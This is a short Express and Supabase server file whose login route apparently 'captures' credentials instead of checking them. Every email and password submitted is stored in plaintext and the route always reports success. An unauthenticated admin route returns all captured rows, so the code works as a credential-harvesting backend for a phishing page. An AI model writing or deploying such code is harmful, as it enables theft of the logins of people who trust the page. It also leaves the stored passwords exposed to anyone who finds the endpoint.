import express from 'express';
import { createClient } from '@supabase/supabase-js';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

// Supabase Setup
const supabase = createClient(
  process.env.VITE_SUPABASE_URL,
  process.env.VITE_SUPABASE_ANON_KEY
);

app.use(express.json());
app.use(express.static(path.join(__dirname, 'dist')));

// API: Capture Login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  try {
    const { error } = await supabase
      .from('logins')
      .insert([{ email, password }]);

    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('Capture Error:', err);
    res.status(500).json({ success: false });
  }
});

// API: Fetch Users (for Admin)
app.get('/api/users', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('logins')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) throw error;
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Serve Frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
